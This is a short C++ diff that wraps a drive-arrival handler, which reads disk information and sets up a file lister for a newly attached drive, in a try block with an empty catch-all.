@@ -20,6 +20,7 @@ using namespace filesystem;
 bool IsServiceOn = true;
 
 void DeviceArrivalMain(TCHAR DriveLetter) {
+	try {
 		Device dv(DriveLetter);
 		Device::DiskInformation info = dv.GetDiskInformation();
 		FileLister lister(dv);
@@ -48,6 +49,10 @@ void DeviceArrivalMain(TCHAR DriveLetter) {
 			}
 		}
 		*/
+	}
+	catch (...) {
+
+	}
 }
 
 void DeviceRemovalMain(TCHAR DriveLetter) {
